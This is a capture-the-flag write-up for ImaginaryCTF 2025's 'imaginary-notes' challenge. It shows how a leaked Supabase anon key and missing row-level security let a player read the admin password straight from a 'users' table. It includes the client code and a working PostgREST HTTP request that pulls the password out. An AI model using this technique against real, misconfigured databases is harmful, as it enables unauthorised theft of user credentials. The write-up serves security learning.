---
title: "web imaginary-notes - ImaginaryCTF 2025"
category: "web"
type: "writeup"
tags: ["api", "web", "leak", "supabase", "postgres", "nextjs", "imaginaryctf", "imaginaryctf-2025", "2025", "ctf-writeup"]
summary: "This challenge revolves around a misconfigured Supabase project combined with a frontend that leaks the anonymous API key."
source:
  name: "CTFtime writeup #40428"
  url: "https://ctftime.org/writeup/40428"
original_source: "https://blog.hitc.at/posts/ctf/imaginaryctf-2025/imaginary-notes/"
ctf:
  name: "ImaginaryCTF 2025"
  year: 2025
  challenge: "web imaginary-notes"
---

## Metadata

- **CTF:** ImaginaryCTF 2025
- **Task:** web imaginary-notes
- **Author team:** fish3r
- **CTFtime tags:** api, web, leak, supabase
- **CTFtime:** <https://ctftime.org/writeup/40428>
- **Original writeup:** <https://blog.hitc.at/posts/ctf/imaginaryctf-2025/imaginary-notes/>

---
## Introduction

This challenge revolves around a **misconfigured Supabase project** combined with a frontend that **leaks the anonymous API key**. Because the `users` table is exposed via PostgREST and row-level security (RLS) was permissive/missing, an attacker can query the `users` table directly with the leaked anon key and extract the **admin password** (which is the flag).

### Context Explanation

* Stack: **Next.js** app, Supabase backend (PostgreSQL + PostgREST).  
* The frontend **embeds** the Supabase URL and **anon** key, then calls database tables directly from the browser.  
* The challenge explicitly states: *"I even put my anonymous key somewhere in the site. The password database is called, ‘users’."*  
* Admin’s password is the **flag**; table name: `users`.

### Directive

1\. Locate the **Supabase anon key** in the client bundle.  
2\. Confirm the `users` table is **readable** with the anon role.  
3\. Query the **admin** row and read the `password` field.

\---

## Solution

### 1) Recon: Find the embedded Supabase client and anon key

Open the client bundle or look for a `supabase.js` in the app code. The project ships a file exactly like this:

```javascript  
// src/app/supabase.js  
import { createClient } from '@supabase/supabase-js'

const supabaseUrl = '<https://dpyxnwiuwzahkxuxrojp.supabase.co>'  
const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.ey...cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI' // <— exposed in frontend

export const supabase = createClient(supabaseUrl, supabaseAnonKey)  
```

This is already a red flag: **the anon key is present client-side** (by design anon keys can be public), but it **must** be paired with strict RLS policies that prevent sensitive reads. We’ll test if `users` is exposed.

### 2) Understand how the app uses the table

The login/sign-up form talks directly to the `users` table:

```javascript  
// src/app/page.js (excerpt)  
const { data: existing } = await supabase  
.from("users")  
.select("id")  
.eq("username", username)  
.maybeSingle()

// ... later on sign-up:  
const { error: insertError } = await supabase.from("users").insert([  
{ username, passw // ...  
```

This shows a thin client directly hitting `users` via PostgREST. If RLS is misconfigured, we can query anything we want with just the anon key.

### 3) Direct API query via PostgREST

Supabase exposes PostgREST at `/rest/v1`. Using only the **anon** key in both `Authorization: Bearer` and `apikey` headers is enough if RLS allows it.

**HTTP PoC** (provided and reproduced):

```HTTP  
GET /rest/v1/users?select=password&username=eq.admin HTTP/2  
Host: [dpyxnwiuwzahkxuxrojp.supabase.co](http://dpyxnwiuwzahkxuxrojp.supabase.co)  
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc...4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI  
Apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmF...4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI  
```

Response:

```json  
[{"password":"ictf{why_d1d_1_g1v3_u_my_@p1_k3y???}"}]  
```
